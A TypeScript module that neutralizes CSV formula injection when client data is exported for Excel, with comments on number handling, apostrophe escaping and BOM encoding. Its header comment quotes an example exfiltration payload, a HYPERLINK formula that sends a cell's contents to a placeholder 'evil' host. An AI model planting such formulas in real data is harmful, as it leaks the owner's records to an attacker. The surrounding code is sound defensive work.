/**
 * CSV formula injection, spec section 13 test scenario "импорт содержит Excel
 * formula injection".
 *
 * A cell whose text begins with `=`, `+`, `-`, `@`, TAB or CR is a formula when
 * Excel opens the file. The attack is a round trip: someone puts
 * `=HYPERLINK("http://evil/?"&A1,"счёт")` into a client name in a salon's
 * booking system, we import it as an ordinary string, and months later the
 * owner exports their clients and opens the file — at which point Excel runs
 * it against their own data.
 *
 * The fix belongs at the point of export, not import. Rewriting the value on
 * the way in would corrupt data we were asked to store faithfully, and it would
 * still not protect rows created any other way. So: import keeps the text,
 * preview flags it so the owner is not surprised, and every CSV we generate
 * neutralizes it.
 */

const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * Numbers legitimately start with `+` and `-`, including the `1 234,50` and
 * `1 234.50` groupings Excel writes with ordinary and non-breaking spaces.
 * Treating `-5` as an attack would mean quoting every negative number in every
 * export.
 */
const PLAIN_NUMBER = /^[+-]?[\d   ']*[.,]?\d+(?:[eE][+-]?\d+)?$/;

export function looksLikeFormula(value: string): boolean {
  if (value.length < 2) return false;
  if (!FORMULA_LEAD.test(value)) return false;
  return !PLAIN_NUMBER.test(value);
}

/**
 * Renders one cell for a file that Excel will open.
 *
 * The leading apostrophe is Excel's own "this is text" marker: it is consumed
 * when the file is opened, so the owner sees the original value and the formula
 * never evaluates. Quoting alone would not help — Excel evaluates a formula
 * inside quotes just the same.
 */
export function escapeCsvCell(value: string, delimiter = ";"): string {
  const guarded = looksLikeFormula(value) ? `'${value}` : value;
  const needsQuotes =
    guarded.includes(delimiter) ||
    guarded.includes('"') ||
    guarded.includes("\n") ||
    guarded.includes("\r");
  return needsQuotes ? `"${guarded.replaceAll('"', '""')}"` : guarded;
}

/**
 * Serializes a table for Excel.
 *
 * The BOM and CRLF are not decoration: without the BOM, Excel on a Russian or
 * Romanian Windows reads a UTF-8 file as Windows-1251 and every Cyrillic name
 * arrives as mojibake. The default `;` matches the separator those same
 * installs expect.
 */
export function toCsv(rows: readonly (readonly string[])[], delimiter = ";"): string {
  const body = rows
    .map((row) => row.map((cell) => escapeCsvCell(cell, delimiter)).join(delimiter))
    .join("\r\n");
  return `﻿${body}\r\n`;
}
